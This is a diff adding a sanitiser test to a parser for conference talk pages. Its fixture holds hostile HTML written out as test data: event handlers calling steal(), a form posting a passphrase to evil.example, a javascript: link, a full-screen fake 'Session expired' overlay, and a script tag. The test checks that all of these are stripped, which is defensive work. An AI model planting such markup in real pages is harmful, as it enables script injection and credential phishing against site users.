@@ -115,6 +115,34 @@ def test_parse_chapter_verses():
     assert d.footnotes[0].pid == "p21"
 
 
+def test_parse_drops_what_could_run_or_cover_the_app():
+    """A page that carries a form, a base, a handler or a style attribute is stored without them."""
+    hostile = TALK_BODY.replace('<h2 data-aid="6" id="p_h">A Heading</h2>', """<h2 data-aid="6" id="p_h" onclick="steal()">A Heading</h2>
+<base href="https://evil.example/"><form action="https://evil.example/take"><input name="passphrase"><button formaction="https://evil.example/x">Sign in</button>
+<select><option>one</option></select><textarea>t</textarea></form>
+<object data="x.swf"></object><embed src="x.swf"><video src="v.mp4" onerror="steal()"></video><link rel="stylesheet" href="https://evil.example/a.css">
+<div id="cover" style="position:fixed;inset:0;z-index:99999" onmouseover="steal()">Session expired</div>
+<p id="p_9"><a id="l1" href="javascript:steal()" target="_top">a link</a> <a id="l2" href="https://example.org/" target="_top" ONCLICK="steal()">kept</a> <img src="x.png" onerror="steal()" srcset="y.png 2x"></p>""")
+    payload = json.loads(json.dumps(TALK_PAYLOAD))
+    payload["content"]["body"] = hostile
+    payload["content"]["footnotes"]["note1"]["text"] = 'See <a href="/study/x" onclick="steal()" style="position:fixed">Alma 32:21</a>.<script>steal()</script><input>'
+    d = parse_content(payload, "/general-conference/2023/10/51nelson")
+    from bs4 import BeautifulSoup
+    for html in (d.body_html, d.footnotes[0].html):
+        soup = BeautifulSoup(html, "html.parser")
+        assert not soup.find_all(["base", "form", "input", "button", "select", "textarea", "object", "embed", "video", "link", "script", "style"])
+        for el in soup.find_all(True):
+            assert not [a for a in el.attrs if a.lower().startswith("on") or a.lower() in ("style", "target", "formaction", "srcset")], el
+        assert "javascript:" not in html and "steal" not in html
+    soup = BeautifulSoup(d.body_html, "html.parser")
+    assert soup.find(id="cover").get_text() == "Session expired" and soup.find(id="l2")["href"] == "https://example.org/" and not soup.find(id="l1").has_attr("href")
+    assert soup.find(id="p_h").get_text() == "A Heading" and soup.find("img")["src"] == "x.png"
+    assert "Alma 32:21" in d.footnotes[0].html and 'href="/study/x"' in d.footnotes[0].html
+    # an ordinary page and its note are stored exactly as before
+    plain = parse_content(TALK_PAYLOAD, "/general-conference/2023/10/51nelson")
+    assert plain.footnotes[0].html == TALK_PAYLOAD["content"]["footnotes"]["note1"]["text"] and 'data-scroll-id="note1"' in plain.body_html
+
+
 def test_parse_content_hash_is_stable():
     a = parse_content(TALK_PAYLOAD, "/x")
     b = parse_content(json.loads(json.dumps(TALK_PAYLOAD)), "/x")
